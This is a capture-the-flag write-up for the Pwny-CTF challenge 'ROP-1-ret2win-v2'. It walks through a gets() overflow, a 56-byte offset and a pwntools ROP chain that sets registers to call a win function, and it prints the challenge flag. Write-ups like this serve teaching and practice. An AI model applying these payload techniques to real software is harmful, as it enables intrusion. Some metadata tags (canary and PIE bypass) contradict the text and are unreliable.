---
title: "ROP-1-ret2win-v2"
ctf: "Pwny-CTF"
category: "pwn"
difficulty: "Not specified"
points: 300
techniques: ["buffer-overflow", "rop", "ret2win", "stack-canary", "pie-bypass", "nx-bypass"]
tools: ["checksec", "netcat", "python"]
keywords: ["ROP-1-ret2win-v2", "Pwny-CTF", "pwn", "buffer-overflow", "rop", "ret2win", "stack-canary", "pie-bypass", "nx-bypass", "checksec", "netcat", "python", "elf", "canary", "pie"]
status: "solved"
has_script: true
source: "Pwny-CTF/CHALLENGES/Pwn/ROP-1-ret2win-v2/notes.md"
---

# ROP-1-ret2win-v2 (Pwny-CTF, pwn)

## Summary
Challenge **ROP-1-ret2win-v2** from the Pwny-CTF CTF, pwn category. Main technique: buffer-overflow. Recognize: a “win” function which tests its arguments -> it is no longer a simple ret2win, you need a small ROP chain to fill the argument registers before the jump.

## Statement and artefacts
`nc chal.sigpwny.com 1392`

I found a way to store as much data as you want for free! Come try out my Super Secure Storage Service!

**Author**: Akhil

- `main`: `char data[32]` + **`gets(data)`** → unlimited buffer overflow.
- `win(int a, int b)` gives the flag **only if** `a==0xdeadbeef` **and** `b==0xcafebabe` (reads `flag.txt`, displays it).
- Protections: **No PIE** (fixed base `0x400000`), **No canary**, **NX**, Partial RELRO → classic ROP, hard-coded addresses.

**Provided files / artifacts:**
- `work/Dockerfile (file, 397 B)`
- `work/chal (file, 19.5 KB)`
- `work/chal_patched (file, 19.5 KB)`

## Recognition signals
- If we observe Free Index confirming the lead, think about “what gadgets to pose the arguments in x86_64”.

## Resolution method
1. **Recon** — `checksec`: No PIE / No canary / NX. `gets` = BOF obvious. Unstripped binary → `elf.sym["win"]` directly.
2. **Offset** — `cyclic(200)`, crash, `cyclic_find(rip_value)` → **56** bytes until saved RIP (`data[32]` + alignment + saved RBP).
3. **Gadgets** (in binary, No PIE):

```python
   rop = ROP(elf)
   ret     = rop.find_gadget(['ret'])[0]            # alignment 16 (movaps)
   pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]   #-> 1st arg (a)
   pop_rsi = rop.find_gadget(['pop rsi','ret'])[0]   #-> 2nd arg (b)
   ```

4. **String** — x86-64 convention: arg1=RDI, arg2=RSI.

```python
   chain = build_rop_chain([ret, pop_rdi, 0xdeadbeef, pop_rsi, 0xcafebabe, ret, elf.sym["win"]])
   payload = cyclic(56) + chain
   sla(b"data: ", payload)
   ```

5. **Result** → `win(0xdeadbeef, 0xcafebabe)` → `You win!` + flag.

## Solve script
Script path: [scripts/pwny.py](scripts/pwny.py)
Script path: [scripts/solve_starter.py](scripts/solve_starter.py)

## Flag
sigpwny{r3t2w1n_0n_st3ro1dz}

## Lessons and reusable patterns
- Recognize: a “win” function which tests its arguments -> it is no longer a simple ret2win, you need a small ROP chain to fill the argument registers before the jump.
- System V calling convention (x86-64): integer args in the order RDI, RSI, RDX, RCX, R8, R9 (then the stack). Hence pop rdi/pop rsi for win(a, b).
- ret alignment: win calls puts/fopen (SSE movaps instructions -> RSP must be aligned to 16). A single ret gadget adds 8 bytes and realigns; otherwise remote crash while it “works” locally.
- No PIE = all addresses (win, gadgets) are fixed -> no need for leaks, unlike a PIE binary.
- Free clue confirmed the lead: “what gadgets to pose the arguments in x86_64”.
